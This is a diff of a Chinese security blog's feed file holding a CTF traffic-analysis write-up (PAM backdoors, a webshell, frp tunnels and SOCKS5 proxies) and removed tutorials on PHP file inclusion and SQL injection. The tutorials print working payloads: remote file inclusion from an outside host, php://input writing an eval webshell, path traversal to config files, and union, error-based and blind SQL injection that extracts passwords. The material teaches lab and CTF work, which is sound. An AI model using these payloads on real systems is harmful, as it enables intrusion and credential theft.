+找配置文件的绝对路径
+
+flag：NSSCTF{&#x2F;etc&#x2F;pam.d&#x2F;common-auth}
+Q2：PAM 认证后门是什么？1. 定义PAM（Pluggable Authentication Modules，可插拔认证模块） 是Linux系统统一的底层认证框架。系统登录、sudo提权、修改用户密码、SSH登录等所有身份校验操作，底层都会调用PAM模块。
+
+主配置目录：/etc/pam.d/
+全局公共认证配置：/etc/pam.d/common-auth，所有系统服务共用这套认证规则。
+工作机制：通过加载.so动态链接库文件，执行认证校验逻辑。
+
+2. PAM认证后门核心原理攻击者利用PAM加载自定义动态库的特性制作持久后门：
+
+编写恶意C代码，编译生成恶意动态链接库（示例：looter.so）；
+修改全局认证配置 /etc/pam.d/common-auth，添加加载恶意.so模块的配置；
+恶意模块实现两大攻击能力：
+万能密码绕过：输入攻击者预设的特殊密码，直接放行认证，无视用户真实密码；
+窃取明文密码：合法用户正常登录、sudo时，悄悄捕获并落地用户输入的明文账号密码。
+
+
+
+3. 后门特点PAM属于系统底层认证机制，隐蔽性极强：
+
+普通改密码、重启服务无法清除后门；
+就算原始入侵漏洞被修复、管理员重置所有用户密码，攻击者依旧能靠万能密码重新登录；
+常规进程、日志排查很难定位PAM恶意模块。
+
+
+二、[陇剑杯 2021]webshell问 1https://www.nssctf.cn/problem/278
+
+过滤器查找http contains &quot;password&quot;
+
+查看数据详情
+
+flag：NSSCTF{Admin123!@#}
+
+问 2https://www.nssctf.cn/problem/279
+
+修改日志文件
+可以通过过滤器查找 http.request.method==&quot;POST&quot; and http contains &quot;log&quot; 
+
+并且修改文件需要权限，我们可以从上一题登录成功后的数据包开始查找。
+
+但是 data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log 并不是绝对路径
+直到第 332 条数据包，我们可以发现黑客在往 1.php 中写入东西
+
+flag：NSSCTF{&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log}
+
+问 3https://www.nssctf.cn/problem/280
+
+查看权限
+过滤器 http contains &quot;whoami&quot;
+
+
+在 Linux 系统中，Apache&#x2F;Nginx 等 Web 服务通常以低权限用户 www-data 运行。黑客获取的权限是：www-data
+flag：NSSCTF{www-data}
+
+问 4https://www.nssctf.cn/problem/281
+
+从问 2 知道写入的文件是 1.php
+flag：NSSCTF{1.php}
+
+问 5https://www.nssctf.cn/problem/282
+
+过滤器查找 http.request.uri contains &quot;1.php&quot;
+
+flag：NSSCTF{frpc}
+Q3：frp 是什么？frp &#x3D; Fast Reverse Proxy
+快速反向代理，一款开源内网穿透工具
+1. 组成
+
+frps → frp server 服务端部署在有公网IP的云服务器上
+frpc → frp client 客户端部署在内网设备（家里电脑、校园网主机）
+
+2. 核心用途（内网穿透）
+实现外网访问局域网内设备，常见场景：
+
+外网远程SSH连接家里Linux主机
+在外远程桌面控制Windows电脑
+将本地Web项目暴露公网，给他人测试
+外网访问NAS网盘、智能家居服务
+
+3. 简单工作流程
+
+内网机器启动 frpc，主动出站连接云服务器 frps，维持长连接隧道
+外网用户访问「云服务器IP:远端端口」
+frps收到请求，通过隧道转发给frpc
+frpc把流量交给内网本地程序
+返回数据原路送回外网访问者
+
+4. 支持协议
+TCP、UDP、HTTP、HTTPS、STCP（安全隧道，访客验证）、XTCP（点对点P2P穿透）
+5. 基础文件说明
+
+frps.ini：服务端配置
+frpc.ini：客户端配置
+
+配置示例：
+(注：frp 在较新的版本中官方推荐使用 .toml 格式)
+
+frps.ini：服务端配置 (部署在公网服务器)
+
+这份配置告诉公网服务器，应该在哪些端口监听客户端的连接，以及开放哪些端口给外部用户访问。
+[common]# 核心通信端口：frp 服务端监听的端口，等待你本地的 frpc 来连接bind_port = 7000# 身份验证：设置一个 token 防止别人随意连接你的服务端token = my_secure_password_123# Web 穿透专用：如果需要穿透 HTTP 服务，必须配置这个公网访问端口vhost_http_port = 8080
+
+
+
+frpc.ini：客户端配置
+
+这份配置告诉本地程序，去哪里寻找服务端，以及要把本地的哪些服务（如 Web 测试环境、SSH 终端）映射到公网出去。
+[common]# 指向服务端的公网 IP 地址server_addr = 1.2.3.4# 必须与服务端 bind_port 保持一致server_port = 7000# 必须与服务端 token 保持一致token = my_secure_password_123# --- 示例 1：穿透本地的 Web 测试环境 ---# （比如你本地用 phpStudy 或 Ubuntu 的 Vulhub 搭建了一个漏洞靶场，运行在 80 端口）[web_test_env]type = httplocal_ip = 127.0.0.1local_port = 80# 外部访问的域名。配置好后，访问 http://test.yourdomain.com:8080 就能看到本地 80 端口的内容custom_domains = test.yourdomain.com# --- 示例 2：穿透 SSH 端口进行远程管理 ---[ssh_access]type = tcplocal_ip = 127.0.0.1local_port = 22# 将公网服务器的 6000 端口，映射到本地的 22 端口# 配置好后，在外部通过 ssh -p 6000 user@1.2.3.4 即可连接到这台本地机器remote_port = 6000
+
+当启动这两个服务后：
+
+本地的 frpc 会带着 token，去敲公网 IP 1.2.3.4 的 7000 端口的门。
+frps 验证通过后，两者建立起一条隐秘的隧道。
+当外部网络有人访问 1.2.3.4:6000 时，frps 就会把流量顺着隧道丢给 frpc，frpc 再把流量转发给本机的 22 端口。
+
+
+问 6https://www.nssctf.cn/problem/283
+
+过滤数据包：http.request.uri contains &quot;1.php&quot;
+查看数据包内容，根据 length，一般数值大的，即进行了文件写入操作。
+
+十六进制数，对其进行 Hex 解码，得到 frpc 配置文件的内容。
+
+黑客通过 &#x2F;1.php 上传了frpc.ini文件，里面配置了frpc的参数，里面包含服务端的IP信息。
+flag: NSSCTF{192.168.239.123}
+
+问 7https://www.nssctf.cn/problem/284
+
+黑客通过 &#x2F;1.php 上传了frpc.ini文件，里面配置了socks5代理的参数。
+
+flag：NSSCTF{0HDFt16cLQJ#JTN276Gp}
+Q4：SOCKS5 是什么？1. 定义
+SOCKS5 是一种代理协议（Socket Secure Version 5），工作在会话层。
+SOCKS5 ≠ HTTP代理
+HTTP代理：只支持网页HTTP&#x2F;HTTPS流量
+SOCKS5：几乎所有流量都能转发（TCP绝大多数程序）
+2.  特点
+
+支持 TCP、UDP
+不解读应用层数据（只管转发数据包）
+支持账号密码认证
+可以搭配 FRP、V2Ray、Clash 等工具使用
+本身不加密。原始SOCKS5流量是明文传输；想要加密，一般外面套一层隧道（FRP&#x2F;TLS、ShadowSocks等）。
+
+3. 和 FRP 的结合
+frp 可以直接在客户端配置开启SOCKS5隧道作用：在内网电脑运行frpc，外网通过frps连接这条socks5代理，使用内网机器的网络上网。
+frpc.ini 里 SOCKS5 配置实例
+[common]server_addr = x.x.x.xserver_port = 7000token = 自定义密钥[socks-proxy]type = tcplocal_ip = 127.0.0.1local_port = 1080remote_port = 1080
+
+
+内网本机开启 socks5：127.0.0.1:1080
+外网设备连接 服务器IP:1080流量 → frps → frpc → 内网socks代理 → 使用内网网络
+
+
+另一种：frp内置socks5服务（不用本地额外开socks程序）
+
+[proxy-socks5]type = socks5remote_port = 1080
+
+ 4. SOCKS5 常见使用场景
+
+浏览器&#x2F;Clash设置代理，走SOCKS5
+SSH动态端口转发本质就是SOCKS5代理
+FRP内网穿透，对外提供内网代理
+游戏、FTP、远程工具都能使用SOCKS5
+
+
+三、[陇剑杯 2021]简单日志分析问 1https://www.nssctf.cn/problem/285
+
+ 在大量 404 响应中出现了一个 500（服务器内部错误），说明该请求触发了服务端异常，这类请求往往对应注入、文件包含等攻击行为。定位到该请求，可从中找到关键字 user
+
+flag：NSSCTF{user}
+
+问 2https://www.nssctf.cn/problem/286
+
+
+发现很像 base64 编码。
+对可疑请求中的字符串做 base64 解码，得到：
+
+flag：NSSCTF{&#x2F;Th4s_IS_VERY_Import_Fi1e}
+
+问 3https://www.nssctf.cn/problem/287
+
+
+base64 解码
+
+flag：NSSCTF{192.168.2.197:8888}
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>Lab-WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>流量分析</tag>
       </tags>
   </entry>
   <entry>
@@ -4156,1756 +6344,6 @@ session.upload_progress.cleanup 会话上传进度是否会自动清理
       </categories>
       <tags>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、漏洞检测与危害1.概念
-文件包含：开发中用于复用代码；
-漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
-危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。
-
-2.漏洞检测
-白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
-黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
-
-二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
-(1) 无后缀拼接限制服务端代码1.php
-&lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
-
-新建1.txt：&lt;?php phpinfo(); ?&gt;访问:http://localhost/include/upload.php?filename=1.txt
-
-txt文件被PHP解析执行。
-
-(2)服务端自动拼接后缀.html（upload2.php）&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;
-
-直接传1.txt会拼接成1.txt.html报错，两种绕过：
-①%00截断（PHP&lt;5.3，magic_quotes_gpc关闭)
-
-原理：%00终止字符串，.html被舍弃。
-访问：http://localhost/include/upload2.php?filename=1.txt%00
-
-②超长路径截断
-原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
-?filename=1.txt......................................................................
-
-(3) 远程文件包含(RFI)
-可加载外网文件，危害更大
-前提：php.ini中allow_url_include = On
-
-①无限制远程包含本地：?filename=http://192.168.0.13:88/1.txt远程1.txt内容&lt;?php phpinfo(); ?&gt;，远程代码被本地服务器执行。
-②服务拼接后缀.html绕过代码：include($filename.&quot;.html&quot;);
-
-方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
-方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
-
-三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
-
-
-
-协议
-PHP版本
-allow_url_fopen
-allow_url_include
-使用示例
-
-
-
-file:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;file:&#x2F;&#x2F;D&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt
-
-
-php:&#x2F;&#x2F;filter
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.index.php
-
-
-php:&#x2F;&#x2F;input
-≥5.2
-off&#x2F;on
-on
-GET传参，POST写入PHP代码
-
-
-zip:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;zip:&#x2F;&#x2F;D&#x2F;xxx.zip&#x2F;23phpcode.txt
-
-
-compress.bzip2:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;compress.bzip2:&#x2F;&#x2F;xxx.bz2
-
-
-compress.zlib:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;compress.zlib:&#x2F;&#x2F;xxx.gz
-
-
-data:&#x2F;&#x2F;
-≥5.2
-on
-on
-?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
-
-
-1、http&#x2F;https协议远程包含常规协议。
-(高亮的部分是伪协议）
-http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
-
-2、php:&#x2F;&#x2F;filter（读取源码，最常用）
-作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
-常用过滤器：convert.base64-encode
-示例 payload：http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php拿到base64字符串后解码得到源代码。
-附加过滤器分类：
-字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
-转换：convert.base64系列、quoted-printable
-压缩：bzip2、zlib
-加密：mdecrypt系列
-
-
-
-3、php:&#x2F;&#x2F;input（POST传入代码执行）
-原理：读取POST原始数据当做PHP代码执行
-示例：
-执行系统命令verGET：?filename=php://inputPOST数据：&lt;?php system(&#39;ver&#39;);?&gt;
-写入一句话木马shell.phpGET：?filename=php://inputPOST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39;); ?&gt;访问shell.php，POST cmd=phpinfo();即可连接蚁剑。
-
-
-
-4、file:&#x2F;&#x2F;协议（读取本地绝对路径文件）
-示例：
-读取hosts：?filename=file:///C:\Windows\System32\drivers\etc\hosts
-
-
-
-5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
-?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
-
-四、不安全文件下载漏洞1. 原理
-本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
-核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
-
-2. Pikachu靶场实操
-下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
-利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
-
-五、补充文件下载与文件包含原理相近：
-
-文件包含：文件被PHP引擎执行
-文件下载：文件直接二进制输出下载到本地
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入漏洞</title>
-    <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
-SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
-
-二、SQL 注入分类常见的注入点：
-?str=xxx?test=xxx?idstr=xxx?id=xxx
-
-1. union 注入1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
-1.2 适用条件：（1）网页存在注入点，有回显。
-（2）需要满足union语句要求，即：
-union前后两个select的结果集应具有相同列数；
-union前后两个select的结果集对应列应是相同数据类型
-1.3 注入步骤：
-首先判断是否存在注入点及注入的类型。
-
-https://地址/?id=1通过修改id的值判断是否存在注入点
-
-
-使用ORDER BY 查询列数
-
-https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
-
-
-判断回显的位置
-
-?id=-1 union select 1,2,3注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
-
-
-获取数据库名
-
-以三个字段数为例：
-?id=-1 union select 1,2,database()		//查询当前数据库?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
-
-
-获取当前数据库中的所有表名
-
-?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;
-
-
-获取当前数据库的表中的所有字段名
-
-?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
-
-where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’
-简化写法(了解)：
-where concat(table_schema,’.’,table_name)&#x3D;’数据库名.表名’
-
-获取当前数据库中，字段里的数据。
-
-?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1// 如果想要数据一一对应，使用concat将多个字段内容合并为输出// 例如：?id=-1 union select 1,2,concat(username, &#x27;:&#x27;, password) from users limit 0,1
-
-1.4 总结
-union 注入要求存在注入点，有回显
-需要满足 union 语句要求
-
-
-2. 报错注入2.1 概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
-2.2 使用条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
-2.3 报错注入命令该部分参考：https://cloud.tencent.com/developer/article/2159753
-2.3.1 groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
-?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
-
-核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
-
-命令解释
-count(*)
-
-
-
-统计有多少行数据，用来触发分组。
-2. `rand(0)`
-
-生成固定的随机数（不是真随机， predictable）
-3. `floor(rand(0)*2)`
-
-结果只有两个：0 或者 1
-4. `group by x`
-
-按 x 分组，MySQL 会建一张临时表存分组结果。
-5. `concat(0x5e, 数据, 0x5e)`
-
-把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
-- `0x5e` = **^** 符号，只是分隔符
-
-
-问题：
-为什么会报错？
-
-
-
-MySQL 做 group by 时：
-- 先算 `floor(rand(0)*2)` → 得到 0 或 1
-- 把结果插入**临时表**
-- 插入时又算了一次 rand (0)
-- 两次结果不一样 → 出现**重复键**
-- 直接报错：**Duplicate entry**（重复条目）
-- 关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
-
-
-
-2. 为什么 rand (14) 更好？
-
-rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
-
-总结
-用 rand() 生成 0&#x2F;1
-用 group by 建临时表
-插入时重复计算 rand ()
-产生重复键报错
-错误信息里带出我们要的数据
-
-
-如何使用
-
-不懂原理知道如何使用即可，想查什么，就把 version() 换成：
-
-database() → 查库名
-table_name → 查表名
-column_name → 查字段
-password → 查数据
-
-示例：
-?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
-
-把想要的数据（这里是 version()）爆在报错信息里。
-2.3.2 xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
-只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
-extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
-
-
-作用：从 XML 里查数据。
-语法：
-
-extractvalue( XML文档, XPath路径 )
-
-updatexml()?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
-
-
-作用：修改 XML 里的数据。
-语法：
-
-updatexml( XML文档, XPath路径, 新值 )
-
-
-注意：
-
-updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：
-&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
-
-0x5e、0x5c 是什么？
-0x5e → ^
-0x5c → __
-
-作用：破坏 XPath 语法，强制报错。
-攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;); // 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
-
-
-获得数据库名字
-
-&#x27; or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or &#x27;
-
-
-获得表名
-
-&#x27; or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or &#x27;
-
-
-获得表的字段
-
-&#x27; or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or &#x27;
-
-
-获得数据
-
-&#x27; or extractvalue(1, concat(0x5c, (select concat(字段1,&#x27;:&#x27;,字段1) from 表名 limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select concat(字段2,&#x27;:&#x27;,密码2) from 表名 limit 0,1), 0x5e), 1) or &#x27;
-
-
-3. 布尔盲注3.1 概念当改变浏览器传给后台SQL的参数后，浏览器没有显⽰对应内容也没有显⽰报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊
-3.2 使用条件⼀般情况下，当带⼊参数为真和假时，⻚⾯会有不同的反映，⽐如有⽆显⽰也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。
-3.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
-
-判断是否存在布尔注入使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。
-
-?id=2 and 1=1?id=2 and 1=2
-
-
-猜解数据库名
-
-a. 判断库名长度
-?id=1 and length(database())&lt;数值?id=1 and length(database())&gt;数值?id=1 and length(database())=数字
-
-示例（假设数据库名为 data）：
-?id=1 and length(database())&lt;5?id=1 and length(database())&gt;2?id=1 and length(database())=4		// true 说明数据库名的长度为4
-
-b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
-
-
-数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
-?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
-
-示例（库名：data）：
-?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
-
-c. 验证库名
-?id=1 and database()=&#x27;库名&#x27;
-
-示例（库名：data）：
-?id=1 and database()=&#x27;data&#x27;
-
-
-猜解库内数据表
-
-a. 判断表数量
-?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
-
-b. 判断表名长度
-// 判断单张表?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字// 判断多张表：?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！//比如：-- 第1张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度-- 第2张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
-
-示例（表名：users）：
-?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;10?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;5?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
-
-c. 逐字符猜解表名
-?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&lt;ASCII值	//先判断范围?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&gt;ASCII值	?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值// 直接填爆出来的库名或者database()都可以
-
-示例（表名：users，以第一个字符 u 为例）：
-?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;120?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
-
-
-猜解表内字段
-
-a.  判断字段总数
-?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=数值
-
-更改数值，挨个测试，表名填自己想查询的表名。
-示例（假如 users 表里面有两个字段分别是 username 和  password）：
-?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27;)=2
-
-b. 判断字段名长度
-?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
-
-示例（查第一个字段名的长度）：
-?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;10?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;1?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))=8 // 第一个字段的长度是8个字符
-
-c. 逐字符猜字段名
-?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
-
-示例（以 username 为例，查第一个字符 u）：
-?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;110?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117
-
-
-猜解表中数据
-
-a. 判断数据长度
-?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
-
-示例：假设获得username 字段第一行数据的内容长度为 2
-?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
-
-b. 逐字符猜数据内容
-?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
-
-示例：假设获得user字段第一行数据第一个字符内容
-?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
-
-
-4. 延迟盲注4.1 概念也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。
-4.2 使用条件union、报错、布尔等搞不定的时候才考虑，效率极低。
-4.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
-
-测试延时注入点
-
-?id=1 and sleep(秒数)
-
-示例：
-?id=1 and sleep(5)
-
-
-猜数据库名
-
-a. 判断库名长度
-?id=1 and if(length(database())=数值,sleep(5),1)
-
-示例：
-?id=1 and if(length(database())=4,sleep(5),1)
-
-b. 逐字符猜库名
-?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
-
-示例：
-?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
-
-
-猜数据表名
-
-a. 判断表名长度
-?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
-
-示例（库名为 data，长度为 4）：
-?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
-
-b. 逐字符猜表名
-?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
-
-示例：
